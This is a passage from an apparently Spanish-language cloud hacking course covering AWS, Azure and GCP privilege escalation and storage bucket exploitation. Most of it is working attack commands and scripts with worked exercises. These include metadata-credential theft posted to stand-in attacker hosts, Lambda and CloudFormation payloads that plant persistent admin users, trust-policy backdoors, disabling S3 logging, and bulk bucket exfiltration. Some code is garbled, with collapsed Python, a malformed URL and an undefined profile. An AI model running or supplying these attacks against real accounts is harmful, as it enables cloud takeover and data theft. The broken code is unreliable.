aws iam put-role-policy --role-name ExistingRole --policy-name EscalatePolicy --policy-document file://admin-policy.json

# Asumir ese rol
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/ExistingRole --role-session-name escalated
```

#### 3.1.3 iam:PassRole

Este es uno de los mas comunes y mas peligrosos. `iam:PassRole` permite pasar un rol a un servicio de AWS (Ec2, Lambda, CloudFormation, etc.).

**Escenario:**
Tu usuario tiene `iam:PassRole` sobre un rol `AdminRole` y tambien tiene permisos para lanzar EC2 o crear funciones Lambda.

**Exploit con EC2:**

```bash
aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t2.micro --iam-instance-profile Name=admin-role-profile --user-data file://extract-creds.sh
```

**extract-creds.sh:**
```bash
#!/bin/bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role/ > /tmp/creds.txt
curl -X POST http://attacker-server.com/steal -d @/tmp/creds.txt
```

**Exploit con Lambda:**

```bash
aws lambda create-function --function-name escalator --runtime python3.9 --role arn:aws:iam::123456789012:role/AdminRole --handler index.handler --zip-file fileb://function.zip

aws lambda invoke --function-name escalator out.txt
```

**function/index.py:**
```python
import boto3
import json

def handler(event, context): sts = boto3.client('sts') creds = sts.get_caller_identity iam = boto3.client('iam') users = iam.list_users return {'status': 'escalated', 'users': users}
```

#### 3.1.4 iam:CreatePolicyVersion

Podes crear una nueva version de una politica managed (no inline).

**Escenario:**
Tenes `iam:CreatePolicyVersion` sobre `arn:aws:iam::123456789012:policy/AdminPolicy`.

```bash
aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/AdminPolicy --policy-document file://admin-policy.json --set-as-default
```

#### 3.1.5 iam:setDefaultPolicyVersion

Combinado con el anterior o solo si ya existen versiones alternativas.

```bash
aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/AdminPolicy

aws iam set-default-policy-version --policy-arn arn:aws:iam::123456789012:policy/AdminPolicy --version-id v2
```

#### 3.1.6 iam:UpdateAssumeRolePolicy

Permite modificar la trust policy de un rol. Esto es letal porque podes hacer que cualquier identidad (incluyendo cuentas externas) pueda asumir el rol.

**Exploit:**

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "AWS": "arn:aws:iam::123456789012:user/hacker-user" }, "Action": "sts:AssumeRole", "Condition": {} } ]
}
```

```bash
aws iam update-assume-role-policy --role-name TargetRole --policy-document file://trust-policy-evil.json

aws sts assume-role --role-arn arn:aws:iam::123456789012:role/TargetRole --role-session-name escalated
```

**Variante avanzada --- permitir a toda una cuenta externa:**

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "AWS": "arn:aws:iam::999999999999:root" }, "Action": "sts:AssumeRole" } ]
}
```

#### 3.1.7 iam:CreateLoginProfile

Si tenes `iam:CreateLoginProfile` sobre cualquier usuario, podes crearle una contrasena y acceder a la consola como ese usuario.

```bash
aws iam create-login-profile --user-name admin-user --password "P@ssw0rd123!" --no-password-reset-required
```

#### 3.1.8 iam:CreateAccessKey

Parecido al anterior, pero creando access keys en vez de contrasena.

```bash
aws iam create-access-key --user-name admin-user
```

#### 3.1.9 Escalada via Lambda (iam:PassRole + lambda:CreateFunction)

Este es un clasico. Tenes `iam:PassRole` para pasar un rol admin a Lambda y `lambda:CreateFunction`.

**Paso 1: Crear el codigo de la [funcion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#funciones) Lambda**
```python
# lambda_function.py
import boto3
import json

def lambda_handler(event, context): sts = boto3.client('sts') identity = sts.get_caller_identity iam = boto3.client('iam') try: iam.create_user(UserName='persistence-user') iam.attach_user_policy( UserName='persistence-user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess' ) access_key = iam.create_access_key(UserName='persistence-user') return { 'statusCode': 200, 'body': json.dumps({ 'user': 'persistence-user created', 'accessKey': access_key['AccessKey']['AccessKeyId'], 'secretKey': access_key['AccessKey']['SecretAccessKey'] }) } except Exception as e: return {'statusCode': 500, 'body': str(e)}
```

**Paso 2: Empaquetar y subir**
```bash
mkdir lambda_package
cp lambda_function.py lambda_package/
cd lambda_package
zip -r ./function.zip .
cd .

aws lambda create-function --function-name escalate-lambda --runtime python3.9 --role arn:aws:iam::123456789012:role/AdminRole --handler lambda_function.lambda_handler --zip-file fileb://function.zip

aws lambda invoke --function-name escalate-lambda out.json
cat out.json
```

#### 3.1.10 Escalada via EC2 (iam:PassRole + ec2:RunInstances)

```bash
# user-data.sh
#!/bin/bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
CREDS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo "$CREDS" | base64
curl -X POST http://attacker-server.com:8080/steal --data-binary @-
```

```bash
aws ec2 run-instances --image-id resolve-ssm:/aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2 --instance-type t2.micro --iam-instance-profile Name=admin-role-profile --user-data file://user-data.sh
```

#### 3.1.11 Escalada via CloudFormation

**Template malicioso (escalate.yaml):**
```yaml
AWSTemplateFormatVersion: '2010-09-09'
Resources: AdminUser: Type: AWS::IAM::User Properties: UserName: cf-admin AdminPolicy: Type: AWS::IAM::Policy Properties: PolicyName: FullAccess PolicyDocument: Version: '2012-10-17' Statement: - Effect: Allow Action: '*' Resource: '*' Users: - !Ref AdminUser AdminKey: Type: AWS::IAM::AccessKey Properties: UserName: !Ref AdminUser
Outputs: AccessKeyId: Value: !Ref AdminKey SecretAccessKey: Value: !GetAtt [AdminKey, SecretAccessKey]
```

```bash
aws cloudformation create-stack --stack-name escalate-stack --template-body file://escalate.yaml --capabilities CAPABILITY_IAM --role-arn arn:aws:iam::123456789012:role/AdminRole

aws cloudformation describe-stacks --stack-name escalate-stack --query 'Stacks[0].Outputs'
```

#### 3.1.14 Ejercicio Practico: Escalada IAM en AWS

**Escenario:**
Te dieron acceso a una cuenta AWS con las siguientes politicas adjuntas a tu usuario:

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Action": [ "iam:ListUsers", "iam:ListRoles", "iam:ListPolicies", "iam:GetPolicy", "iam:GetPolicyVersion", "iam:PassRole" ], "Resource": "*" }, { "Effect": "Allow", "Action": [ "lambda:CreateFunction", "lambda:InvokeFunction", "lambda:GetFunction" ], "Resource": "*" } ]
}
```

**Objetivo:** Escalar a administrador.

**Solucion paso a paso:**

**Paso 1: Enumerar roles disponibles**
```bash
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement.Principal.Service | contains(@, "lambda.amazonaws.com")]' --output table
```

**Paso 2: Encontrar un rol con AdminAccess**
```bash
for role in $(aws iam list-roles --query 'Roles[*].RoleName' --output text); do policies=$(aws iam list-attached-role-policies --role-name $role --query 'AttachedPolicies[?PolicyArn==`arn:aws:iam::aws:policy/AdministratorAccess`]') if [ "$policies" != "" ]; then echo "Role $role has AdminAccess!" fi
done
```

**Paso 3: Crear y ejecutar Lambda**
```bash
echo 'def handler(event, context): import boto3, json iam = boto3.client("iam") iam.create_user(UserName="pwned") iam.attach_user_policy(UserName="pwned", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess") k = iam.create_access_key(UserName="pwned") return {"id": k["AccessKey"]["AccessKeyId"], "secret": k["AccessKey"]["SecretAccessKey"]}' > index.py

zip function.zip index.py

aws lambda create-function --function-name pwn --runtime python3.9 --role arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/AdminRole --handler index.handler --zip-file fileb://function.zip

aws lambda invoke --function-name pwn output.json
cat output.json
```

### 3.2 [azure](../raw/cl0ud-h4ck1ng.md#azure) RBAC Privilege Escalation

#### 3.2.1 Abuso de Roles de Administrador

En Azure, los roles clasicos que buscamos son:

- **Owner:** Control total sobre recursos.
- **Contributor:** Puede crear y modificar recursos (pero no asignar roles).
- **User Access Administrator:** Puede asignar roles.
- **Key Vault Contributor:** Puede modificar Key Vault access policies.
- **Managed Identity Contributor:** Puede crear y asignar managed identities.

**Escenario:**
Tenes Contributor en una subscription. Con Contributor no podes asignar roles directamente, pero podes crear recursos que ejecuten codigo con identidades mas permisivas.

```bash
# Ver tu rol asignado
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --output table

# Listar roles disponibles
az role definition list --output table
```

#### 3.2.2 Escalada via Managed Identity

Las managed identities son como roles de AWS pero en Azure. Si tenes Contributor en un recurso que tiene una managed identity con permisos elevados, podes extraer su token.

**Escenario:**
Un resource group tiene una VM con una managed identity que es Owner de la subscription. Tenes Contributor sobre la VM.

```bash
# Ejecutar comando en la VM para extraer token
az vm run-command invoke \ --resource-group my-rg \ --name my-vm \ --command-id RunShellScript \ --scripts 'curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"'
```

**Tambien podes crear un Custom Script Extension:**
```bash
az vm extension set \ --resource-group my-rg \ --vm-name my-vm \ --name customScript \ --publisher Microsoft.Azure.Extensions \ --settings '{"commandToExecute": "curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ -H Metadata:true > /tmp/token.txt"}'
```

#### 3.2.3 Abuso de Azure Resource Manager

**Escenario:**
Tenes Contributor en una subscription. Podes crear un Automation Account, asignarle una managed identity, y ejecutar runbooks.

```bash
# Crear Automation Account
az automation account create \ --name esc-automation \ --resource-group my-rg \ --location eastus

# Crear runbook
az automation runbook create \ --automation-account-name esc-automation \ --resource-group my-rg \ --name get-creds \ --type PowerShell

# Publicar runbook
az automation runbook publish \ --automation-account-name esc-automation \ --resource-group my-rg \ --name get-creds
```

#### 3.2.4 Escalada via Automation Account

Si ya existe un Automation Account con una identidad que tiene Owner, se puede modificar un runbook existente.

```bash
# Obtener managed identity del Automation Account
az automation account show \ --name target-automation \ --resource-group target-rg \ --query identity

# Ver que roles tiene esa managed identity
az role assignment list --assignee <principal-id> --output table
```

**Runbook malicioso ([powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)):**
```powershell
# Extraer token de managed identity
$response = Invoke-RestMethod -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata='true'}
Write-Output "Token: $($response.access_token)"

# Usar el token para asignar Owner
$token = $response.access_token
$headers = @{Authorization = "Bearer $token"}
$body = @{ properties = @{ roleDefinitionId = "/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635" principalId = "attacker-principal-id" }
}
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleAssignments/$([guid]::NewGuid)?api-version=2022-04-01" -Method PUT -Headers $headers -Body ($body | ConvertTo-Json)
```

#### 3.2.5 Escalada via Logic Apps

Las Logic Apps pueden ejecutar codigo y tienen managed identities.

```bash
# Ver logic apps existentes
az logic workflow list --resource-group target-rg --output table

# Ver managed identity de una logic app
az logic workflow show --name target-logicapp --resource-group target-rg --query identity
```

**Modificar una Logic App existente:**
```json
{ "definition": { "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#", "actions": { "HTTP": { "type": "Http", "inputs": { "method": "GET", "uri": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "headers": { "Metadata": "true" } }, "runAfter": {}, "metadata": {} } }, "triggers": { "manual": { "type": "Request" } } }
}
```

#### 3.2.6 Ejercicio Practico: Escalada RBAC en Azure

**Escenario:**
Tenes Contributor en un resource group llamado `hackme-rg`. Este resource group contiene una VM Linux llamada `victim-vm` que tiene una managed identity asignada. La managed identity es Contributor en la subscription entera.

**Objetivo:** Escalar a Owner de la subscription.

**Solucion paso a paso:**

**Paso 1: Verificar tu acceso**
```bash
az account show
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --output table
```

**Paso 2: Identificar la managed identity de la VM**
```bash
az vm show --name victim-vm --resource-group hackme-rg --query identity
```

**Paso 3: Extraer token de la managed identity**
```bash
cat << 'EOF' > extract.sh
#!/bin/bash
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
EOF

az vm extension set \ --resource-group hackme-rg \ --vm-name victim-vm \ --name customScript \ --publisher Microsoft.Azure.Extensions \ --settings '{"fileUris": ["https://mystorageaccount.blob.core.windows.net/scripts/extract.sh"], "commandToExecute": "bash extract.sh"}'
```

**Paso 4: Usar el token para asignar Owner**
```powershell
$token = "eyJ0eXAiOiJKV1Qi.."
$body = @{ properties = @{ roleDefinitionId = "/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635" principalId = "tu-principal-id" }
} | ConvertTo-Json

Invoke-RestMethod -Method PUT \ -Uri "https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleAssignments/$([guid]::NewGuid)?api-version=2022-04-01" \ -Headers @{Authorization = "Bearer $token"; Content-Type = "application/json"} \ -Body $body
```

### 3.3 [gcp](../raw/cl0ud-h4ck1ng.md#gcp) IAM Privilege Escalation

#### 3.3.1 Abuso de Service Account Keys

Si encontras una service account key (archivo JSON), tenes acceso como esa service account.

```bash
# Usar una service account key
gcloud auth activate-service-account --key-file=key.json

# Ver identidad
gcloud auth list

# Probar permisos
gcloud projects get-iam-policy [PROJECT_ID] --format json
```

**Escenario de escalada:**
Encontraste una key de una service account que es `roles/iam.securityAdmin` en el proyecto.

```bash
# Listar todas las service accounts
gcloud iam service-accounts list --project [PROJECT_ID]

# Crear una nueva SA admin
gcloud iam service-accounts create rogue-sa

gcloud projects add-iam-policy-binding [PROJECT_ID] \ --member serviceAccount:rogue-sa@[PROJECT_ID].iam.gserviceaccount.com \ --role roles/owner

gcloud iam service-accounts keys create rogue-key.json \ --iam-account rogue-sa@[PROJECT_ID].iam.gserviceaccount.com
```

#### 3.3.2 Escalada via Cloud Functions

GCP Cloud Functions tiene una caracteristica interesante: cuando creas una funcion, podes especificar que service account usar.

**Escenario:**
Tenes `cloudfunctions.functions.create` y `iam.serviceAccounts.actAs` sobre una service account admin.

```python
# main.py
import requests

def escalate(request): metadata_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" headers = {"Metadata-Flavor": "Google"} r = requests.get(metadata_url, headers=headers) token = r.json["access_token"] create_sa_url = "https://iam.googleapis.com/v1/projects/[PROJECT_ID]/serviceAccounts" headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"} body = { "accountId": "rogue-sa", "displayName": "Rogue Service Account" } requests.post(create_sa_url, headers=headers, json=body) return "Escalated", 200
```

```bash
gcloud functions deploy escalate \ --runtime python311 \ --trigger-http \ --service-account admin-sa@[PROJECT_ID].iam.gserviceaccount.com \ --allow-unauthenticated

gcloud functions call escalate
```

#### 3.3.3 Escalada via Cloud KMS

Cloud KMS maneja claves criptograficas. Si tenes `cloudkms.cryptoKeys.setIamPolicy`, podes darte permisos.

```bash
# Listar key rings
gcloud kms keyrings list --location global --project [PROJECT_ID]

# Listar keys
gcloud kms keys list --location global --keyring [KEYRING] --project [PROJECT_ID]

# Ver la politica IAM actual
gcloud kms keys get-iam-policy [KEY] --location global --keyring [KEYRING]

# Modificar la politica para darnos decrypt
gcloud kms keys add-iam-policy-binding [KEY] \ --location global \ --keyring [KEYRING] \ --member user:attacker@domain.com \ --role roles/cloudkms.cryptoKeyDecrypter

# Descifrar datos
echo "ciphertext_base64" | gcloud kms decrypt \ --location global \ --keyring [KEYRING] \ --key [KEY] \ --plaintext-file - \ --ciphertext-file -
```

#### 3.3.4 Escalada via Cloud Run

Cloud Run tambien permite especificar service accounts.

```bash
gcloud run deploy escalate \ --image gcr.io/[PROJECT_ID]/escalate \ --service-account admin-sa@[PROJECT_ID].iam.gserviceaccount.com \ --allow-unauthenticated \ --region us-central1

curl https://escalate-xxxxx-uc.a.run.app
```

#### 3.3.5 Escalada via Compute Engine

Si tenes `compute.instances.create` y `iam.serviceAccounts.actAs` sobre una SA admin, podes crear una instancia con esa SA y extraer el token.

```bash
gcloud compute instances create escalate-instance \ --zone us-central1-a \ --service-account admin-sa@[PROJECT_ID].iam.gserviceaccount.com \ --scopes cloud-platform \ --metadata startup-script='#!/bin/bash curl -H "Metadata-Flavor: Google" \ http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \ > /tmp/token.txt curl -X POST http://[ATTACKER_IP]:8080/ -d @/tmp/token.txt'
```

#### 3.3.6 Ejercicio Practico: Escalada IAM en GCP

**Escenario:**
Te dieron acceso a un proyecto GCP como `user:test@domain.com` con el rol `roles/iam.serviceAccountUser` y `roles/iam.serviceAccountKeyAdmin` sobre la service account `admin-sa@[PROJECT_ID].iam.gserviceaccount.com`.

**Objetivo:** Convertirte en Owner del proyecto.

**Solucion:**

**Paso 1: Verificar tu acceso**
```bash
gcloud auth list
gcloud projects get-iam-policy [PROJECT_ID] --format json | findstr test@domain.com
```

**Paso 2: Listar keys de la SA admin**
```bash
gcloud iam service-accounts keys list \ --iam-account admin-sa@[PROJECT_ID].iam.gserviceaccount.com
```

**Paso 3: Crear una nueva key para la SA admin**
```bash
gcloud iam service-accounts keys create admin-key.json \ --iam-account admin-sa@[PROJECT_ID].iam.gserviceaccount.com
```

**Paso 4: Activar la SA admin**
```bash
gcloud auth activate-service-account --key-file=admin-key.json
```

**Paso 5: Asignarnos Owner**
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \ --member user:test@domain.com \ --role roles/owner
```

**Paso 6: Revertir a nuestro usuario y verificar**
```bash
gcloud config set account test@domain.com
gcloud projects get-iam-policy [PROJECT_ID] --format json | findstr test@domain.com
```

### 3.4 Trust Policies y Role Chaining

#### 3.4.1 Cross-Account Role Assumption

Una de las configuraciones mas explotadas es la trust policy que permite asumir roles desde cuentas externas.

**Trust policy vulnerable:**
```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "AWS": "arn:aws:iam::999999999999:root" }, "Action": "sts:AssumeRole" } ]
}
```

**Trust policy MAS vulnerable:**
```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "AWS": "*" }, "Action": "sts:AssumeRole" } ]
}
```

#### 3.4.2 Role Chaining en AWS

Role chaining es cuando asumis un rol, y desde ese rol asumis otro rol.

**Escenario:**
- Rol A puede asumir Rol B
- Rol B puede asumir Rol C (Admin)

```bash
# Paso 1: Asumir Rol A
creds_a=$(aws sts assume-role \ --role-arn arn:aws:iam::123456789012:role/RoleA \ --role-session-name chain1)

aws configure set aws_access_key_id $(echo $creds_a | jq -r .Credentials.AccessKeyId) --profile chain1
aws configure set aws_secret_access_key $(echo $creds_a | jq -r .Credentials.SecretAccessKey) --profile chain1
aws configure set aws_session_token $(echo $creds_a | jq -r .Credentials.SessionToken) --profile chain1

# Paso 2: Desde Rol A, asumir Rol B
creds_b=$(aws sts assume-role \ --role-arn arn:aws:iam::123456789012:role/RoleB \ --role-session-name chain2 \ --profile chain1)

aws configure set aws_access_key_id $(echo $creds_b | jq -r .Credentials.AccessKeyId) --profile chain2
aws configure set aws_secret_access_key $(echo $creds_b | jq -r .Credentials.SecretAccessKey) --profile chain2
aws configure set aws_session_token $(echo $creds_b | jq -r .Credentials.SessionToken) --profile chain2

# Paso 3: Desde Rol B, asumir Rol C (Admin)
creds_c=$(aws sts assume-role \ --role-arn arn:aws:iam::123456789012:role/RoleC \ --role-session-name admin \ --profile chain2)

aws sts get-caller-identity --profile chain3
```

**Limitacion:** Hay un limite de 1 hora por default en la sesion. La cadena maxima es de 5 roles.

#### 3.4.3 Federacion de Identidades

AWS IAM Federation permite que usuarios de un Identity Provider (IdP) externo accedan a AWS. Los atacantes pueden explotar trust policies mal configuradas en federaciones.

**[saml](../raw/hybr1d-1d3nt1ty.md#saml) Federation Abuse:**
Si un IdP SAML esta configurado con una trust policy demasiado permisiva, el atacante puede crear un usuario en el IdP que mapee a un rol admin.

#### 3.4.4 SAML y OIDC Abuse

AWS tambien soporta OIDC (OpenID Connect) para federacion. GitHub Actions, GitLab CI, etc. usan esto.

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" }, "Action": "sts:AssumeRoleWithWebIdentity", "Condition": { "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" }, "StringLike": { "token.actions.githubusercontent.com:sub": "repo:my-org/*:*" } } } ]
}
```

**Explotacion:** Si la condicion `sub` es demasiado amplia (ej: `repo:*`), cualquier repo de GitHub puede asumir el rol.

---

## 4. Storage Bucket exploitation

### 4.1 [aws](../raw/cl0ud-h4ck1ng.md#aws) [s3](../raw/cl0ud-h4ck1ng.md#s3): Anatomy de un Bucket

S3 (Simple Storage Service) es el almacenamiento de objetos de AWS. Es uno de los servicios mas atacados porque la gente suele dejar buckets publicos sin querer.

**Estructura de un bucket S3:**
- **Bucket Name:** Globalmente unico (entre todas las cuentas AWS).
- **Objects:** Archivos almacenados con una key (path).
- **Version ID:** Cada version de un objeto.
- **Metadata:** Informacion adicional del objeto.
- **Tags:** Etiquetas para organizacion.
- **ACL:** Access Control List ([legacy](../raw/l3g4cy-3nt3rpr1s3.md)).
- **Bucket Policy:** Politica resource-based.
- **Public Access Block:** Bloqueo de acceso publico.

**ARN de un bucket:**
```
arn:aws:s3:::bucket-name
arn:aws:s3:::bucket-name/key-path/*
```

#### 4.1.1 Public Bucket Discovery

El primer paso es encontrar buckets publicos. Hay varias formas:

**Metodo 1: [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) de nombres de buckets**
```bash
for bucket in $(cat bucket-names.txt); do response=$(aws s3 ls s3://$bucket --no-sign-request 2>&1) if [[ $response != *"AccessDenied"* ]] && [[ $response != *"NoSuchBucket"* ]]; then echo "Bucket publico encontrado: $bucket" fi
done
```

**Metodo 2: Usar Grayhat Warfare**
```bash
curl "https://buckets.grayhatwarfare.com/api/v1/buckets?access_token=tu-token"
```

**Metodo 3: [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) enumeration**
```bash
nslookup bucket-name.s3.amazonaws.com
nslookup bucket-name.s3.us-east-1.amazonaws.com
```

**Metodo 4: Bucket Finder**
```bash
git clone https://github.com/brendan-rius/s3-bucket-finder
cd s3-bucket-finder
python s3-bucket-finder.py bucket-names.txt
```

**Wordlist de nombres comunes:**
```
backup, prod, production, dev, development, staging, test, testing
logs, log, data, files, assets, media, static, uploads, downloads
config, configs, private, public, internal, external, archive
reports, docs, documentation, backups, db, database, sql, dump
export, import, temp, tmp, bucket, buckets, storage, s3, aws
company-name, companyname, company-name-backup, company-name-prod
company-name-dev, company-name-logs
```

#### 4.1.2 Data Exfiltration desde S3

Una vez que encontras un bucket publico o tenes acceso, podes exfiltrar datos.

```bash
# Listar contenido del bucket
aws s3 ls s3://victim-bucket --no-sign-request

# Descargar todo
aws s3 sync s3://victim-bucket ./exfiltrated --no-sign-request

# O solo archivos especificos
aws s3 cp s3://victim-bucket/secret.txt . --no-sign-request

# Usando wget
wget -r --no-parent https://victim-bucket.s3.amazonaws.com/

# Generar presigned URL
aws s3 presign s3://victim-bucket/secret.txt --expires-in 3600
```

#### 4.1.3 ACL Manipulation

```bash
# Listar ACL actual
aws s3api get-bucket-acl --bucket victim-bucket

# Dar acceso publico
aws s3api put-bucket-acl --bucket victim-bucket --acl public-read

# A nivel objeto
aws s3api put-object-acl --bucket victim-bucket --key secret.txt --acl public-read
```

**ACL predefinidas:**
- `private`: Solo el dueno.
- `public-read`: Lectura publica.
- `public-read-write`: Lectura/escritura publica.
- `authenticated-read`: Lectura para usuarios AWS autenticados.
- `bucket-owner-read`: Lectura para el dueno del bucket.
- `bucket-owner-full-control`: Control total al dueno del bucket.

#### 4.1.4 Bucket Policy Exploitation

Las bucket policies son JSON similar a las IAM policies. Si tenes `s3:PutBucketPolicy`, podes modificarlas.

**Bucket policy vulnerable:**
```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::victim-bucket/*" } ]
}
```

**Modificar una bucket policy para exfiltrar datos:**
```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "AWS": "arn:aws:iam::999999999999:root" }, "Action": ["s3:GetObject", "s3:ListBucket"], "Resource": [ "arn:aws:s3:::victim-bucket", "arn:aws:s3:::victim-bucket/*" ] } ]
}
```

```bash
aws s3api put-bucket-policy --bucket victim-bucket --policy file://policy.json
```

#### 4.1.5 Object Versioning Attacks

Si el versioning esta habilitado en el bucket, las versiones anteriores de los objetos se mantienen.

```bash
# Verificar si un bucket tiene versioning
aws s3api get-bucket-versioning --bucket victim-bucket

# Listar versiones de objetos
aws s3api list-object-versions --bucket victim-bucket

# Descargar version especifica
aws s3api get-object --bucket victim-bucket --key secret.txt --version-id "VERSION_ID" secret-v1.txt

# Eliminar el delete marker (recupera el objeto)
aws s3api delete-object --bucket victim-bucket --key secret.txt --version-id "DELETE_MARKER_VERSION"
```

#### 4.1.6 S3 Server Access Logging Evasion

```bash
# Verificar si el logging esta habilitado
aws s3api get-bucket-logging --bucket victim-bucket

# Deshabilitar logging
aws s3api put-bucket-logging --bucket victim-bucket --bucket-logging-status '{}'
```

#### 4.1.7 S3 Event Notifications Abuse

Si tenes `s3:PutBucketNotification`, podes redirigir eventos de S3 a un recurso que controles.

```json
{ "LambdaFunctionConfigurations": [ { "Id": "LambdaToAttacker", "LambdaFunctionArn": "arn:aws:lambda:us-east-1:999999999999:function:attacker", "Events": ["s3:ObjectCreated:*"] } ]
}
```

```bash
aws s3api put-bucket-notification-configuration \ --bucket victim-bucket \ --notification-configuration file://notification.json
```

#### 4.1.8 S3 Transfer Acceleration Exploitation

```bash
aws s3 cp large-file.txt s3://bucket/large-file.txt --endpoint-url https://bucket.s3-accelerate.amazonaws.com
```

#### 4.1.9 Ejercicio Practico: S3 Bucket Exploitation

**Escenario:**
Escaneando la web, encontraste que la empresa `ejemplo.com` usa AWS. Su dominio `app.ejemplo.com` carga assets desde `httpss)://assets-ejemplo.s3-us-west-2.amazonaws.com/`.

**Objetivo:** Encontrar buckets relacionados y exfiltrar datos.

**Solucion paso a paso:**

**Paso 1: Enumerar buckets relacionados**
```bash
for name in assets-ejemplo ejemplo-assets ejemplo-backup \ ejemplo-prod ejemplo-dev ejemplo-staging \ ejemplo-data ejemplo-files ejemplo-logs \ ejemplo-config ejemplo-db ejemplo-temp; do for region in us-east-1 us-west-2 eu-west-1 ""; do if [ -z "$region" ]; then url="https://${name}.s3.amazonaws.com/" else url="https://${name}.s3-${region}.amazonaws.com/" fi response=$(curl -s -o /dev/null -w "%{http_code}" "$url" --max-time 5) if [ "$response" != "404" ]; then echo "$url - HTTP $response" fi done
done
```

**Paso 2: Probar acceso publico al bucket assets**
```bash
aws s3 ls s3://assets-ejemplo --no-sign-request
```

**Paso 3: Listar y descargar**
```bash
aws s3 ls s3://assets-ejemplo --recursive --no-sign-request
aws s3 sync s3://assets-ejemplo ./assets --no-sign-request
```

**Paso 4: Buscar archivos sensibles**
```bash
Get-ChildItem -Path ./assets -Recurse -Include *.config, *.sql, *.json, *.yml, *.yaml, *.env, *.txt, *.md, *.pdf, *.xlsx, *.csv
```

### 4.2 [azure](../raw/cl0ud-h4ck1ng.md#azure) Blob Storage

#### 4.2.1 Blob [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) Discovery

Azure Blob Storage funciona con storage accounts. Cada storage account tiene containers.

```bash
# Probar URLs comunes
for name in empresa empresa-assets empresastorage empresa-backup; do url="https://${name}.blob.core.windows.net/" response=$(curl -s -o /dev/null -w "%{http_code}" "$url") if [ "$response" != "404" ] && [ "$response" != "400" ]; then echo "Found: $url - $response" fi
done
```

**Usando MicroBurst:**
```bash
git clone https://github.com/NetSPI/MicroBurst
Import-Module ./MicroBurst/MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base empresa
```

#### 4.2.2 SAS Token Exploitation

SAS (Shared Access Signature) tokens son URLs con [permisos](../raw/0s-f0nd4m3nt0s.md#permisos)](0s temporales.

**SAS token en URLs:**
```
https://empresastorage.blob.core.windows.net/backups/db.sql?sv=2020-08-04&se=2024-12-31T23:59:59Z&sr=b&sp=r&sig=abc123def456
```

**Partes de un SAS token:**
- `sv`: Storage service version
- `se`: Expiry time
- `sr`: Resource (b=blob, c=container)
- `sp`: Permissions (r=read, w=write, d=delete, l=list)
- `sig`: Signature

```bash
# Descargar con SAS
curl "https://empresastorage.blob.core.windows.net/backups/db.sql?sv=2020-08-04&se=2024-12-31T23:59:59Z&sr=b&sp=r&sig=abc123def456" -o db.sql

# Enumerar container con SAS
curl "https://empresastorage.blob.core.windows.net/backups?restype=container&comp=list&sv=2020-08-04&se=2024-12-31T23:59:59Z&sr=c&sp=rl&sig=abc123def456"

# Subir archivo con SAS de escritura
curl -X PUT \ -H "x-ms-blob-type: BlockBlob" \ -d "malicious content" \ "https://empresastorage.blob.core.windows.net/uploads/evil.txt?sv=2020-08-04&se=2025-12-31T23:59:59Z&sr=c&sp=w&sig=xxx"
```

#### 4.2.3 Storage Account Key Abuse

```bash
az storage blob list \ --account-name empresastorage \ --account-key "xxxxx" \ --container-name backups

az storage blob download-batch \ --account-name empresastorage \ --account-key "xxxxx" \ --source backups \ --destination ./exfil
```

#### 4.2.4 Ejercicio Practico: Azure Blob Exploitation

**Escenario:**
MicroBurst encontro `empresastorage.blob.core.windows.net`. El container `backups` existe.

**Objetivo:** Listar y descargar backups.

